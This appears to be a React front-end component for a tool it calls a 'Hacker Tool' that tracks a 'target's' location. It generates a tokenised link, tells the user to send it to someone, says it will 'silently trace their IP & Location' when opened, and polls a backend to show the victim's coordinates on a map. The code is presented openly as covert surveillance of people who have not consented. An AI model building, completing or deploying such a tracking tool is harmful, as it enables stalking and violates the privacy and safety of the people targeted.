import { useEffect, useState } from "react";
import axios from "axios";
import './index.css'

function Home() {
  const [token, setToken] = useState("");
  const [siteLink, setSiteLink] = useState("");
  const [location, setLocation] = useState(null);

  useEffect(() => {
    const newToken = crypto.randomUUID();
    setToken(newToken);
    const deployedSimplePage = "https://simple-page-amber.vercel.app/";
    setSiteLink(`${deployedSimplePage}?token=${newToken}`);
  }, []);

  // ⏳ Poll every 5 seconds for new location
  useEffect(() => {
    if (!token) return;

    const interval = setInterval(() => {
      axios
        .get(`http://localhost:3000/location/${token}`)
        .then((res) => {
          setLocation(res.data); // {location: {lat, lon}, accessedAt}
        })
        .catch(() => {
          setLocation(null); // clear if nothing found yet
        });
    }, 5000);

    return () => clearInterval(interval);
  }, [token]);

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono flex flex-col justify-center items-center px-6">
      {/* Heading */}
      <h1 className="text-4xl md:text-6xl font-bold mb-8 text-center">
        🎯 Hacker Tool: Track Target’s Location
      </h1>

                
        {/* Radar Animation */}
<div className="relative w-72 h-72 mb-10">
  {/* Pulsing radar ring */}
  <div className="absolute inset-0 border-2 border-green-500 rounded-full animate-ping-slow"></div>

  {/* Static radar circle */}
  <div className="absolute inset-0 border border-green-600 rounded-full"></div>

  {/* Rotating beam */}
  <div className="absolute inset-0 flex items-center justify-center">
    <div className="w-[2px] h-[144px] bg-green-400 origin-bottom animate-spin-sweep translate-y-[-70px]"></div>
  </div>

  {/* Glowing dots */}
  <div className="absolute top-[25%] left-[60%] w-2 h-2 bg-green-400 rounded-full shadow-[0_0_8px_3px_rgba(34,197,94,0.7)] animate-pulse"></div>
  <div className="absolute top-[60%] left-[35%] w-2 h-2 bg-green-400 rounded-full shadow-[0_0_8px_3px_rgba(34,197,94,0.7)] animate-pulse delay-500"></div>
  <div className="absolute top-[40%] left-[45%] w-2 h-2 bg-green-400 rounded-full shadow-[0_0_8px_3px_rgba(34,197,94,0.7)] animate-pulse delay-[800ms]"></div>
</div>

        





      {/* Description */}
      <p className="text-lg md:text-xl text-center mb-6 max-w-xl">
        Share the link below with anyone. Once they open it, we’ll silently trace their <span className="text-green-300">IP & Location</span>.
      </p>

      {/* Share Link Box */}
      <div className="bg-green-900/20 border border-green-500 rounded-xl p-4 shadow-lg w-full max-w-lg text-center">
        <p className="mb-2">👉 Send this link to your target:</p>
        <input
          value={siteLink}
          readOnly
          className="w-full bg-transparent border border-green-400 rounded-md px-4 py-2 text-green-300 text-sm focus:outline-none"
          onClick={(e) => e.target.select()}
        />
      </div>

      {/* Location Result (conditionally shown) */}
      {location && (
        <div className="mt-8 text-center space-y-3">
          <p className="text-green-300 text-sm">
            🎯 Target Coordinates:
            <br />
            <strong>Lat:</strong> {location.location.lat.toFixed(5)} |{" "}
            <strong>Lon:</strong> {location.location.lon.toFixed(5)}
          </p>

          <a
            href={`/map?lat=${location.location.lat}&lon=${location.location.lon}`}
            className="inline-block bg-green-400 text-black px-6 py-2 rounded-md hover:scale-105 transition"
          >
            🌍 View on Map
          </a>
        </div>
      )}

      <p className="mt-6 text-green-600 text-xs">* Works best on mobile browsers</p>
    </div>
  );
}

export default Home;